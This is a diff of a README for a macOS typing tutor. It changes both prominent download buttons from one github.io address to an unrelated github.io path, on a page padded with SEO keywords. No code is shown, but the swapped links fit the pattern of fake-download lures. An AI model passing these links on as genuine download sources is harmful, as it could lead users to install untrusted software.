@@ -4,7 +4,7 @@
 
 <!-- Download Button #1 — shield/badge style -->
 <div align="center" style="margin:14px 0 18px;">
-  <a href="http://typeteach-us.github.io/.github">
+  <a href="https://rumpels-kaji.github.io/.github/Type">
     <img src="https://img.shields.io/badge/⬇️_GET_TYPETEACH_US-royalblue?style=for-the-badge&logo=apple&logoColor=white" alt="Download TypeTeach US for macOS">
   </a>
 </div>
@@ -137,7 +137,7 @@ typeteach us • typing tutor mac • touch typing us keyboard • learn typing 
 
 <!-- Download Button #2 — pill/gradient style -->
 <div align="center" style="margin:18px 0 22px;">
-  <a href="http://typeteach-us.github.io/.github" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#6366f1,#06b6d4);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(99,102,241,.28);">
+  <a href="https://rumpels-kaji.github.io/.github/Type" style="display:inline-block;padding:12px 22px;border-radius:999px;background:linear-gradient(90deg,#6366f1,#06b6d4);color:#fff;font-weight:900;text-decoration:none;box-shadow:0 10px 24px rgba(99,102,241,.28);">
     🚀 Download TypeTeach US for macOS
   </a>
 </div>
